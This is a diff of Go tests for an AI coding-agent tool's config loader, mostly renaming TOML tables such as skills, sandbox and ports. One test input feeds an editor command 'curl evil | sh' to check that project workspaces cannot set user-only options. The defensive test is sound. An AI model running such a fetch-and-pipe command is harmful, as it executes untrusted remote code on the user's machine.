@@ -32,7 +32,7 @@ func TestConfiguredSkillDirectoriesResolvesAbsoluteRelativeAndHomePaths(t *testi
 	absolute := filepath.Join(t.TempDir(), "skills")
 	home := t.TempDir()
 	t.Setenv("HOME", home)
-	contents := "[input]\nnudge = \"carry on\"\n[agent]\nround_robin = [\"opencode/deepseek@hi\"]\n[editor]\ncommand = \"  subl  \"\n[skills]\ninclude = [\"" + absolute + "\", \"shared/skills\", \"~/agents/skills\"]\n"
+	contents := "[input]\nnudge = \"carry on\"\n[agent]\nround_robin = [\"opencode/deepseek@hi\"]\n[editor]\ncommand = \"  subl  \"\n[skill]\ninclude = [\"" + absolute + "\", \"shared/skills\", \"~/agents/skills\"]\n"
 	if err := writeConfigFile(path, contents); err != nil {
 		t.Fatal(err)
 	}
@@ -131,7 +131,7 @@ func TestRoundRobinModelFileMustContainASelectionBesideComments(t *testing.T) {
 
 func TestConfiguredDefaultCapabilitiesRejectUnknownFlags(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[defaults]\ncaps = \"rwz\"\n"); err != nil {
+	if err := writeConfigFile(path, "[default]\ncaps = \"rwz\"\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -170,11 +170,11 @@ func TestConfiguredOllamaHostCannotBeEmpty(t *testing.T) {
 
 func TestConfiguredHostnameNamesTheSession(t *testing.T) {
 	settings := configFrom(t, `
-		[ports]
-		hostname = "  preview-{session}.agent  "
+		[experimental]
+		forward_hostname = "  preview-{session}.agent  "
 	`)
 
-	if got := settings.Ports.GetHostname("tame-impala", "127.27.192.223"); got != "preview-tame-impala.agent" {
+	if got := settings.GetHostname("tame-impala", "127.27.192.223"); got != "preview-tame-impala.agent" {
 		t.Errorf("got %q", got)
 	}
 }
@@ -182,7 +182,7 @@ func TestConfiguredHostnameNamesTheSession(t *testing.T) {
 func TestTheDefaultHostnameIsTheSessionAddress(t *testing.T) {
 	settings := configFrom(t, "")
 
-	if got := settings.Ports.GetHostname("tame-impala", "127.27.192.223"); got != "127.27.192.223" {
+	if got := settings.GetHostname("tame-impala", "127.27.192.223"); got != "127.27.192.223" {
 		t.Errorf("got %q", got)
 	}
 }
@@ -194,13 +194,13 @@ func TestConfiguredHostnameNeedsExactlyOneSessionPlaceholder(t *testing.T) {
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
-			contents := "[ports]\nhostname = \"" + hostname + "\"\n"
+			contents := "[experimental]\nforward_hostname = \"" + hostname + "\"\n"
 			if err := writeConfigFile(path, contents); err != nil {
 				t.Fatal(err)
 			}
 
 			_, err := Load(path)
-			if err == nil || !strings.Contains(err.Error(), "ports.hostname must contain {session} exactly once") {
+			if err == nil || !strings.Contains(err.Error(), "experimental.forward_hostname must contain {session} exactly once") {
 				t.Errorf("got error %v", err)
 			}
 		})
@@ -222,7 +222,7 @@ func TestConfiguredHostnameRefusesWhatNoHostnameHolds(t *testing.T) {
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
-			if err := writeConfigFile(path, "[ports]\nhostname = "+written+"\n"); err != nil {
+			if err := writeConfigFile(path, "[experimental]\nforward_hostname = "+written+"\n"); err != nil {
 				t.Fatal(err)
 			}
 
@@ -230,10 +230,29 @@ func TestConfiguredHostnameRefusesWhatNoHostnameHolds(t *testing.T) {
 			if err == nil {
 				t.Fatalf("%s was accepted", written)
 			}
-			if !strings.Contains(err.Error(), "ports.hostname") {
+			if !strings.Contains(err.Error(), "experimental.forward_hostname") {
 				t.Errorf("got error %v, want it to name the setting", err)
 			}
 		})
+	}
+}
+
+func TestAHostnameThatIsNotTextIsReportedAsTheWrongKind(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "config.toml")
+	if err := writeConfigFile(path, "[experimental]\nforward_hostname = 5\n"); err != nil {
+		t.Fatal(err)
+	}
+
+	settings, err := Load(path)
+	if err != nil {
+		t.Fatalf("got %v, want the number reported rather than refused as empty", err)
+	}
+	reports := strings.Join(settings.UnknownSettings(), "\n")
+	if !strings.Contains(reports, "experimental.forward_hostname: this toggle wants a string") {
+		t.Errorf("got reports %q, want one saying the hostname wants a string", reports)
+	}
+	if got := settings.GetHostname("session", "fallback"); got != "fallback" {
+		t.Errorf("got hostname %q, want the fallback", got)
 	}
 }
 
@@ -245,7 +264,7 @@ func TestConfiguredHostnameAcceptsAHostname(t *testing.T) {
 		"{session}9",
 	} {
 		path := filepath.Join(t.TempDir(), "config.toml")
-		if err := writeConfigFile(path, "[ports]\nhostname = "+strconv.Quote(hostname)+"\n"); err != nil {
+		if err := writeConfigFile(path, "[experimental]\nforward_hostname = "+strconv.Quote(hostname)+"\n"); err != nil {
 			t.Fatal(err)
 		}
 
@@ -253,7 +272,7 @@ func TestConfiguredHostnameAcceptsAHostname(t *testing.T) {
 		if err != nil {
 			t.Fatalf("%q was refused: %v", hostname, err)
 		}
-		if got, want := config.Ports.Hostname, hostname; got != want {
+		if got, want := config.getHostname(), hostname; got != want {
 			t.Errorf("got %q, want %q", got, want)
 		}
 	}
@@ -279,8 +298,8 @@ func TestAMissingConfigFileIsAllowed(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(config.Skills.Include) != 0 || len(config.Sandbox.Deny) != 0 ||
-		len(config.Sandbox.Read) != 0 || len(config.Sandbox.Write) != 0 || len(config.Sandbox.Exec) != 0 {
+	if len(config.Skills.Include) != 0 || len(config.Grants.Deny) != 0 ||
+		len(config.Grants.Read) != 0 || len(config.Grants.Write) != 0 || len(config.Grants.Exec) != 0 {
 		t.Errorf("got %#v, want no configured paths", config)
 	}
 	if len(config.Editor.Command) != 0 {
@@ -318,14 +337,14 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if err := os.Mkdir(filepath.Dir(globalPath), 0o700); err != nil {
 		t.Fatal(err)
 	}
-	if err := writeConfigFile(globalPath, "[ui]\ncurrency = \"GBP\"\n[agent]\nround_robin = [\"anthropic/global\"]\n[sandbox]\nread = [\"shared\"]\n"); err != nil {
+	if err := writeConfigFile(globalPath, "[ui]\ncurrency = \"GBP\"\n[agent]\nround_robin = [\"anthropic/global\"]\n[grants]\nread = [\"shared\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 	overridePath := filepath.Join(directory, "project", "oh.toml")
 	if err := os.Mkdir(filepath.Dir(overridePath), 0o700); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(overridePath, []byte("[defaults]\ncaps = \"rwg\"\n[ui]\ncurrency = \"EUR\"\n[snippets]\nreview = { prompt = \"Review.\", arguments = \"none\" }\n"), 0o600); err != nil {
+	if err := os.WriteFile(overridePath, []byte("[default]\ncaps = \"rwg\"\n[ui]\ncurrency = \"EUR\"\n[snippet]\nreview = { prompt = \"Review.\", arguments = \"none\" }\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -345,8 +364,8 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if !slices.Equal(settings.Agent.RoundRobin, []string{"anthropic/global"}) {
 		t.Errorf("got model rotation %#v", settings.Agent.RoundRobin)
 	}
-	if !slices.Equal(settings.Sandbox.Read, []string{filepath.Join(filepath.Dir(globalPath), "shared")}) {
-		t.Errorf("got read paths %#v", settings.Sandbox.Read)
+	if !slices.Equal(settings.Grants.Read, []string{filepath.Join(filepath.Dir(globalPath), "shared")}) {
+		t.Errorf("got read paths %#v", settings.Grants.Read)
 	}
 	override, exists := settings.GetOverride()
 	if !exists {
@@ -355,7 +374,7 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if override.Path != overridePath {
 		t.Errorf("got override path %q, want %q", override.Path, overridePath)
 	}
-	wantSettings := []string{"defaults.caps", "snippets.review", "ui.currency"}
+	wantSettings := []string{"default.caps", "snippet.review", "ui.currency"}
 	if !slices.Equal(override.Settings, wantSettings) {
 		t.Errorf("got overridden settings %#v, want %#v", override.Settings, wantSettings)
 	}
@@ -394,17 +413,17 @@ func TestAnOverriddenPaletteIsReportedAsOneSettingRatherThanEveryColour(t *testi
 func TestAWorkspaceMayNotSetWhatOnlyTheUserShould(t *testing.T) {
 	for name, body := range map[string]string{
 		"editor":         "[editor]\ncommand = [\"sh\", \"-c\", \"curl evil | sh\"]\n",
-		"sandbox deny":   "[sandbox]\ndeny = [\"foo.txt\"]\n",
-		"sandbox read":   "[sandbox]\nread = [\"~\"]\n",
-		"sandbox write":  "[sandbox]\nwrite = [\"~\"]\n",
-		"sandbox exec":   "[sandbox]\nexec = [\"~\"]\n",
-		"sandbox path":   "[sandbox]\npath = [\"~\"]\n",
-		"sandbox home":   "[sandbox]\nhome = [\"~\"]\n",
-		"skills include": "[skills]\ninclude = [\"instructions\"]\n",
+		"sandbox deny":   "[grants]\ndeny = [\"foo.txt\"]\n",
+		"sandbox read":   "[grants]\nread = [\"~\"]\n",
+		"sandbox write":  "[grants]\nwrite = [\"~\"]\n",
+		"sandbox exec":   "[grants]\nexec = [\"~\"]\n",
+		"sandbox path":   "[grants]\npath = [\"~\"]\n",
+		"sandbox home":   "[grants]\nhome = [\"~\"]\n",
+		"skills include": "[skill]\ninclude = [\"instructions\"]\n",
 		"provider":       "[provider.ollama]\nhost = \"http://elsewhere:11434\"\n",
 		"experimental":   "[experimental]\nsomething = true\n",
-		"skills exclude": "[skills]\nexclude = [\"safety\"]\n",
-		"an empty list":  "[skills]\ninclude = []\n",
+		"skills exclude": "[skill]\nexclude = [\"safety\"]\n",
+		"an empty list":  "[skill]\ninclude = []\n",
 	} {
 		t.Run(name, func(t *testing.T) {
 			directory := t.TempDir()
@@ -436,7 +455,7 @@ func TestAWorkspaceMayNotSetWhatOnlyTheUserShould(t *testing.T) {
 func TestTheUserAloneStillSetsThoseSettings(t *testing.T) {
 	directory := t.TempDir()
 	globalPath := filepath.Join(directory, "config.toml")
-	body := "[editor]\ncommand = [\"vi\"]\n[skills]\ninclude = [\"skills\"]\n[sandbox]\nread = [\"read\"]\n" +
+	body := "[editor]\ncommand = [\"vi\"]\n[skill]\ninclude = [\"skills\"]\n[grants]\nread = [\"read\"]\n" +
 		"[provider.ollama]\nhost = \"http://localhost:11434\"\n[experimental]\nsomething = true\n"
 	if err := writeConfigFile(globalPath, body); err != nil {
 		t.Fatal(err)
@@ -454,10 +473,10 @@ func TestTheUserAloneStillSetsThoseSettings(t *testing.T) {
 		t.Fatal(err)
 	}
 	if want := []string{filepath.Join(directory, "skills")}; !slices.Equal(settings.Skills.Include, want) {
-		t.Errorf("skills.include = %#v, want %#v", settings.Skills.Include, want)
+		t.Errorf("skill.include = %#v, want %#v", settings.Skills.Include, want)
 	}
-	if want := []string{filepath.Join(directory, "read")}; !slices.Equal(settings.Sandbox.Read, want) {
-		t.Errorf("sandbox.read = %#v, want %#v", settings.Sandbox.Read, want)
+	if want := []string{filepath.Join(directory, "read")}; !slices.Equal(settings.Grants.Read, want) {
+		t.Errorf("grants.read = %#v, want %#v", settings.Grants.Read, want)
 	}
 	if want := "http://localhost:11434"; settings.Provider.Ollama.Host != want {
 		t.Errorf("provider.ollama.host = %q, want %q", settings.Provider.Ollama.Host, want)
@@ -577,7 +596,7 @@ func TestAConfigFromANewerOhIsRefusedBeforeItsShapeIsRead(t *testing.T) {
 
 func TestConfiguredSkillDirectoriesRejectsAnEmptyDirectory(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[skills]\ninclude = [\"\"]\n"); err != nil {
+	if err := writeConfigFile(path, "[skill]\ninclude = [\"\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -586,9 +605,9 @@ func TestConfiguredSkillDirectoriesRejectsAnEmptyDirectory(t *testing.T) {
 	}
 }
 
-func TestTheSingularSkillTableIsReported(t *testing.T) {
+func TestThePluralSkillTableIsReported(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[skill]\ninclude = [\"skills\"]\n"); err != nil {
+	if err := writeConfigFile(path, "[skills]\ninclude = [\"skills\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -597,7 +616,7 @@ func TestTheSingularSkillTableIsReported(t *testing.T) {
 		t.Fatal(err)
 	}
 	reports := config.UnknownSettings()
-	want := []string{path + ": unknown: skill"}
+	want := []string{path + ": unknown: skills"}
 	if !slices.Equal(reports, want) {
 		t.Errorf("got reports %q, want %q", reports, want)
 	}
@@ -632,7 +651,7 @@ mystery_more = true
 func TestConfiguredSkillExclusionsResolveToAbsoluteDirectories(t *testing.T) {
 	configDir := t.TempDir()
 	path := filepath.Join(configDir, "config.toml")
-	if err := writeConfigFile(path, "[skills]\nexclude = [\"skills/pi\"]\n"); err != nil {
+	if err := writeConfigFile(path, "[skill]\nexclude = [\"skills/pi\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -648,7 +667,7 @@ func TestConfiguredSkillExclusionsResolveToAbsoluteDirectories(t *testing.T) {
 
 func TestConfiguredSkillExclusionsRejectAnEmptyDirectory(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[skills]\nexclude = [\"\"]\n"); err != nil {
+	if err := writeConfigFile(path, "[skill]\nexclude = [\"\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -666,7 +685,7 @@ func TestConfiguredStringsCannotBeEmpty(t *testing.T) {
 		"agent model":                 "[agent]\nmodel = \"\"\n",
 		"agent model whitespace":      "[agent]\nmodel = \"  \"\n",
 		"ui currency":                 "[ui]\ncurrency = \" \"\n",
-		"ports hostname":              "[ports]\nhostname = \"\"\n",
+		"forward hostname":            "[experimental]\nforward_hostname = \"\"\n",
 		"editor command list":         "[editor]\ncommand = []\n",
 		"editor command string":       "[editor]\ncommand = \"  \"\n",
 		"input nudge":                 "[input]\nnudge = \"\"\n",
@@ -723,7 +742,7 @@ func TestTheConfiguredSpeedDialIsTrimmed(t *testing.T) {
 
 func TestAStringSnippetIsItsPrompt(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[snippets]\ngold = \"  Consider the goldens.  \"\n"); err != nil {
+	if err := writeConfigFile(path, "[snippet]\ngold = \"  Consider the goldens.  \"\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -740,17 +759,17 @@ func TestAStringSnippetIsItsPrompt(t *testing.T) {
 
 func TestAnEmptyStringSnippetIsRejected(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[snippets]\ngold = \"  \"\n"); err != nil {
+	if err := writeConfigFile(path, "[snippet]\ngold = \"  \"\n"); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippets.gold") {
+	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippet.gold") {
 		t.Errorf("got error %v", err)
 	}
 }
 
 func TestANonStringNonTableSnippetIsRejected(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[snippets]\ngold = 5\n"); err != nil {
+	if err := writeConfigFile(path, "[snippet]\ngold = 5\n"); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "not a prompt or a table") {
@@ -760,7 +779,7 @@ func TestANonStringNonTableSnippetIsRejected(t *testing.T) {
 
 func TestRichConfiguredSnippetsAreLoaded(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	contents := `[snippets]
+	contents := `[snippet]
 review = { prompt = "  Review {{ .Arg }}.  ", description = "  Review changes.  ", arguments = "optional" }
 `
 	if err := writeConfigFile(path, contents); err != nil {
@@ -780,7 +799,7 @@ review = { prompt = "  Review {{ .Arg }}.  ", description = "  Review changes.  
 
 func TestSnippetDescriptionAndArgumentsAreOptional(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[snippets]\nreview = { prompt = \"Review {{ .Arg }}.\" }\n"); err != nil {
+	if err := writeConfigFile(path, "[snippet]\nreview = { prompt = \"Review {{ .Arg }}.\" }\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -805,7 +824,7 @@ func TestSnippetPromptFilesAreRelativeToTheConfig(t *testing.T) {
 		t.Fatal(err)
 	}
 	configPath := filepath.Join(configDirectory, "config.toml")
-	contents := `[snippets]
+	contents := `[snippet]
 review = { file = "snippets/review.md", description = "Review changes.", arguments = "required" }
 `
 	if err := writeConfigFile(configPath, contents); err != nil {
@@ -824,13 +843,13 @@ review = { file = "snippets/review.md", description = "Review changes.", argumen
 
 func TestAMissingSnippetPromptFileIsRejected(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	contents := `[snippets]
+	contents := `[snippet]
 review = { file = "missing.md", description = "Review changes.", arguments = "required" }
 `
 	if err := writeConfigFile(path, contents); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippets.review") {
+	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippet.review") {
 		t.Errorf("got error %v", err)
 	}
 }
@@ -845,10 +864,10 @@ func TestRichSnippetDefinitionsAreValidated(t *testing.T) {
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
-			if err := writeConfigFile(path, "[snippets]\nreview = "+definition+"\n"); err != nil {
+			if err := writeConfigFile(path, "[snippet]\nreview = "+definition+"\n"); err != nil {
 				t.Fatal(err)
 			}
-			if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippets.review") {
+			if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "snippet.review") {
 				t.Errorf("got error %v", err)
 			}
 		})
@@ -857,7 +876,7 @@ func TestRichSnippetDefinitionsAreValidated(t *testing.T) {
 
 func TestConfiguredSnippetPromptsCannotBeEmpty(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	contents := `[snippets]
+	contents := `[snippet]
 review = { prompt = "  ", description = "Review changes.", arguments = "none" }
 `
 	if err := writeConfigFile(path, contents); err != nil {
@@ -865,8 +884,8 @@ review = { prompt = "  ", description = "Review changes.", arguments = "none" }
 	}
 
 	_, err := Load(path)
-	if err == nil || !strings.Contains(err.Error(), "snippets.review") {
-		t.Errorf("expected snippets.review error, got %v", err)
+	if err == nil || !strings.Contains(err.Error(), "snippet.review") {
+		t.Errorf("expected snippet.review error, got %v", err)
 	}
 }
 
@@ -875,7 +894,7 @@ func TestConfiguredAccessPathsAreResolved(t *testing.T) {
 	path := filepath.Join(configDir, "config.toml")
 	home := t.TempDir()
 	t.Setenv("HOME", home)
-	contents := "[sandbox]\ndeny = [\"foo.txt\"]\nread = [\"~/reference\"]\nwrite = [\"output\"]\nexec = [\"/opt/tools\"]\n" +
+	contents := "[grants]\ndeny = [\"foo.txt\"]\nread = [\"~/reference\"]\nwrite = [\"output\"]\nexec = [\"/opt/tools\"]\n" +
 		"path = [\"~/toolbox/bin\"]\nhome = [\"~/.gitconfig\"]\n"
 	if err := writeConfigFile(path, contents); err != nil {
 		t.Fatal(err)
@@ -896,18 +915,18 @@ func TestConfiguredAccessPathsAreResolved(t *testing.T) {
 			}
 		}
 	}
-	assertPaths("deny", config.Sandbox.Deny, []string{"foo.txt"})
-	assertPaths("read", config.Sandbox.Read, []string{filepath.Join(home, "reference")})
-	assertPaths("write", config.Sandbox.Write, []string{filepath.Join(configDir, "output")})
-	assertPaths("exec", config.Sandbox.Exec, []string{"/opt/tools"})
-	assertPaths("path", config.Sandbox.Path, []string{filepath.Join(home, "toolbox", "bin")})
-	assertPaths("home", config.Sandbox.Home, []string{filepath.Join(home, ".gitconfig")})
+	assertPaths("deny", config.Grants.Deny, []string{"foo.txt"})
+	assertPaths("read", config.Grants.Read, []string{filepath.Join(home, "reference")})
+	assertPaths("write", config.Grants.Write, []string{filepath.Join(configDir, "output")})
+	assertPaths("exec", config.Grants.Exec, []string{"/opt/tools"})
+	assertPaths("path", config.Grants.Path, []string{filepath.Join(home, "toolbox", "bin")})
+	assertPaths("home", config.Grants.Home, []string{filepath.Join(home, ".gitconfig")})
 }
 
 func TestAPathMappedIntoTheShellHomeMustComeFromTheHomeDirectory(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
 	t.Setenv("HOME", t.TempDir())
-	if err := writeConfigFile(path, "[sandbox]\nhome = [\"/etc/gitconfig\"]\n"); err != nil {
+	if err := writeConfigFile(path, "[grants]\nhome = [\"/etc/gitconfig\"]\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -915,7 +934,7 @@ func TestAPathMappedIntoTheShellHomeMustComeFromTheHomeDirectory(t *testing.T) {
 	if err == nil {
 		t.Fatal("expected an error")
 	}
-	if !strings.Contains(err.Error(), "sandbox.home") {
+	if !strings.Contains(err.Error(), "grants.home") {
 		t.Errorf("the error does not name the setting: %v", err)
 	}
 }
@@ -1140,7 +1159,7 @@ func TestTheBuiltInDefaultsSetEverySettingThereIs(t *testing.T) {
 	}
 
 	for _, key := range []string{
-		"version", "defaults", "input", "snippets", "skills", "sandbox", "bar",
+		"version", "default", "input", "snippet", "skill", "grants", "bar",
 	} {
 		if _, ok := written[key]; !ok {
 			t.Errorf("expected the defaults to say what %q is", key)
@@ -1177,7 +1196,7 @@ func testSegments() segment.Registry {
 		"turn-count":         inertFactory,
 		"git-branch":         inertFactory,
 		"git-status":         inertFactory,
-		"jobs":               inertFactory,
+		"tasks":              inertFactory,
 		"subagents":          inertFactory,
 		"subscription-usage": inertFactory,
 	}
@@ -1243,7 +1262,7 @@ func brokenLayout(t *testing.T, body string) (segment.Layout, error) {
 
 func TestAConfigWrittenBeforeThemesExistedNeedsNoMigrating(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := os.WriteFile(path, []byte("version = 14\n[ui]\ncurrency = \"GBP\"\n"), 0o600); err != nil {
+	if err := os.WriteFile(path, fmt.Appendf(nil, "version = %d\n[ui]\ncurrency = \"GBP\"\n", Format), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -1298,24 +1317,24 @@ func TestAToolThemeOverridesOnePartWithoutDroppingTheRest(t *testing.T) {
 
 func TestAToolDefaultReachesEveryActionThatSetsNothingOfItsOwn(t *testing.T) {
 	config := configFrom(t, `
-		[ui.theme.tool.job]
+		[ui.theme.tool.task]
 		default = { paint = "status_danger" }
 	`)
 
 	resolved := config.Ui.Theme.Tool.Resolved()
 	for kind, want := range map[string]style.ToolPaint{
-		"job":         "status_danger",
-		"job_start":   "status_danger",
-		"job_restart": "status_danger",
-		"job_status":  "normal",
-		"job_output":  "normal",
-		"job_list":    "normal",
+		"task":         "status_danger",
+		"task_stop":    "status_danger",
+		"task_restart": "status_danger",
+		"task_status":  "normal",
+		"task_output":  "normal",
+		"task_list":    "normal",
 	} {
 		if got := resolved[kind].Paint; got != want {
 			t.Errorf("%s is painted %q, want %q", kind, got, want)
 		}
 	}
-	if got := resolved["job_output"].Name; got != "cat" {
+	if got := resolved["task_output"].Name; got != "read output for" {
 		t.Errorf("the output action was renamed %q", got)
 	}
 	if got := resolved["forward_add"].Paint; got != "status_warning" {
@@ -1325,19 +1344,19 @@ func TestAToolDefaultReachesEveryActionThatSetsNothingOfItsOwn(t *testing.T) {
 
 func TestAnActionCanBeRestyledAlone(t *testing.T) {
 	config := configFrom(t, `
-		[ui.theme.tool.job]
-		start = { name = "launch" }
+		[ui.theme.tool.task]
+		restart = { name = "launch" }
 		output = { paint = "dim" }
 	`)
 
 	resolved := config.Ui.Theme.Tool.Resolved()
-	if got := resolved["job_start"]; got.Name != "launch" || got.Paint != "status_warning" {
-		t.Errorf("job_start resolves to %+v, want the new name and the inherited paint", got)
+	if got := resolved["task_restart"]; got.Name != "launch" || got.Paint != "status_warning" {
+		t.Errorf("task_restart resolves to %+v, want the new name and the inherited paint", got)
 	}
-	if got := resolved["job_output"]; got.Name != "cat" || got.Paint != "dim" {
-		t.Errorf("job_output resolves to %+v, want the default name and the new paint", got)
+	if got := resolved["task_output"]; got.Name != "read output for" || got.Paint != "dim" {
+		t.Errorf("task_output resolves to %+v, want the default name and the new paint", got)
 	}
-	if got := resolved["job_stop"]; got.Name != "stop" {
+	if got := resolved["task_stop"]; got.Name != "stop" {
 		t.Errorf("an untouched action was renamed %q", got.Name)
 	}
 }
@@ -1362,16 +1381,16 @@ func TestAProjectActionOverrideInheritsTheGlobalAppearance(t *testing.T) {
 	directory := t.TempDir()
 	globalPath := filepath.Join(directory, "config.toml")
 	if err := writeConfigFile(globalPath, `
-		[ui.theme.tool.job]
+		[ui.theme.tool.task]
 		default = { paint = "#010203" }
-		start = { name = "launch", paint = "#040506" }
+		restart = { name = "launch", paint = "#040506" }
 	`); err != nil {
 		t.Fatal(err)
 	}
 	overridePath := filepath.Join(directory, "oh.toml")
 	if err := os.WriteFile(overridePath, []byte(`
-		[ui.theme.tool.job]
-		start = { name = "kick-off" }
+		[ui.theme.tool.task]
+		restart = { name = "kick-off" }
 	`), 0o600); err != nil {
 		t.Fatal(err)
 	}
@@ -1385,25 +1404,25 @@ func TestAProjectActionOverrideInheritsTheGlobalAppearance(t *testing.T) {
 	}
 
 	resolved := config.Ui.Theme.Tool.Resolved()
-	if got := resolved["job_start"]; got.Name != "kick-off" || got.Paint != "#040506" {
-		t.Errorf("job_start resolves to %+v, want the local name with the global paint", got)
+	if got := resolved["task_restart"]; got.Name != "kick-off" || got.Paint != "#040506" {
+		t.Errorf("task_restart resolves to %+v, want the local name with the global paint", got)
 	}
-	if got := resolved["job_stop"]; got.Paint != "#010203" {
-		t.Errorf("job_stop is painted %q, want the global default", got.Paint)
+	if got := resolved["task_stop"]; got.Paint != "#010203" {
+		t.Errorf("task_stop is painted %q, want the global default", got.Paint)
 	}
 }
 
 func TestLoadingAConfigDoesNotChangeTheBuiltInTheme(t *testing.T) {
 	configFrom(t, `
-		[ui.theme.tool.job]
-		start = { name = "launch" }
+		[ui.theme.tool.task]
+		restart = { name = "launch" }
 		default = { paint = "dim" }
 	`)
 
-	if got := style.DefaultTheme().Tool["job"].Actions["start"].Name; got != "" {
+	if got := style.DefaultTheme().Tool["task"].Actions["restart"].Name; got != "restart" {
 		t.Errorf("a loaded config changed the built-in theme: %q", got)
 	}
-	if got := style.DefaultTheme().Tool["job"].Default.Paint; got != "status_warning" {
+	if got := style.DefaultTheme().Tool["task"].Default.Paint; got != "status_warning" {
 		t.Errorf("a loaded config changed the built-in paint to %q", got)
 	}
 }
@@ -1447,8 +1466,8 @@ default = { name = "" }
 		"invalid paint": `[ui.theme.tool.read]
 default = { paint = "chartreuse" }
 `,
-		"invalid action paint": `[ui.theme.tool.job]
-start = { paint = "chartreuse" }
+		"invalid action paint": `[ui.theme.tool.task]
+restart = { paint = "chartreuse" }
 `,
 		"unknown key": `[ui.theme.tool.read]
 default = { colour = "dim" }
@@ -1562,7 +1581,7 @@ func TestTheStreamingModeDefaultsToWholeLines(t *testing.T) {
 
 func TestAConfigWrittenBeforeTheStreamingModeExistedNeedsNoMigrating(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := os.WriteFile(path, []byte("version = 14\n[ui]\ncurrency = \"GBP\"\n"), 0o600); err != nil {
+	if err := os.WriteFile(path, fmt.Appendf(nil, "version = %d\n[ui]\ncurrency = \"GBP\"\n", Format), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -1635,7 +1654,7 @@ func TestTheDebugSettingsAreRead(t *testing.T) {
 
 func TestTheToolOutputLimitIsRead(t *testing.T) {
 	config := configFrom(t, `
-		[defaults]
+		[default]
 		tool_output = "48K"
 	`)
 
@@ -1688,19 +1707,19 @@ func TestASubagentConcurrencyBelowOneIsRefused(t *testing.T) {
 
 func TestAToolOutputLimitTooSmallToSayAnythingWithIsRefused(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[defaults]\ntool_output = \"3\"\n"); err != nil {
+	if err := writeConfigFile(path, "[default]\ntool_output = \"3\"\n"); err != nil {
 		t.Fatal(err)
 	}
 
 	_, err := Load(path)
-	if err == nil || !strings.Contains(err.Error(), "defaults.tool_output is too small") {
-		t.Errorf("got %v, want a complaint about defaults.tool_output", err)
+	if err == nil || !strings.Contains(err.Error(), "default.tool_output is too small") {
+		t.Errorf("got %v, want a complaint about default.tool_output", err)
 	}
 }
 
 func TestAToolOutputLimitThatIsNotASizeIsRefused(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[defaults]\ntool_output = \"a bit\"\n"); err != nil {
+	if err := writeConfigFile(path, "[default]\ntool_output = \"a bit\"\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -1712,7 +1731,7 @@ func TestAToolOutputLimitThatIsNotASizeIsRefused(t *testing.T) {
 
 func TestAConfigWrittenBeforeTheToolOutputLimitExistedNeedsNoMigrating(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := os.WriteFile(path, []byte("version = 14\n[ui]\ncurrency = \"GBP\"\n"), 0o600); err != nil {
+	if err := os.WriteFile(path, fmt.Appendf(nil, "version = %d\n[ui]\ncurrency = \"GBP\"\n", Format), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -1833,7 +1852,7 @@ func TestTheGroupingDefaultsToReasoningRunningOnFromTools(t *testing.T) {
 
 func TestAConfigWrittenBeforeTheGroupingExistedNeedsNoMigrating(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
